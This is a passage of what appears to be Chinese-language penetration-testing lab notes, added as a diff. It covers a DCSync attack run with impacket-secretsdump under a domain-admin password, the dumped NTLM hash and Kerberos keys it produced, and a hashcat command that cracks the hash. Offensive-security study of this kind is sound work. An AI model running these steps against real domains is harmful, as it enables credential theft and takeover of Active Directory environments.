+dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
+[*] Kerberos keys grabbed
+dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
+dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
+dave:des-cbc-md5:1a329b4338bfa215
+[*] Cleaning up...
+```
+>`impacket-secretsdump`: 使用 Impacket 工具來提取帳戶憑證\
+`-just-dc-user dave`: 只針對 dave 執行 DCSync 攻擊\
+`corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.181.70`: 以 jeffadmin（Domain admin）身分執行攻擊\
+`@192.168.181.70` → 指定目標 Domain Controller IP。
+>> dave/`08d7a47a6f9f66b97b1bae4178747494`
+
+#### 2-1 Hashct 爆破
+NTLM mode: 1000
+```
+┌──(chw㉿CHW)-[~]
+└─$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+# Lateral Movement in Active Directory
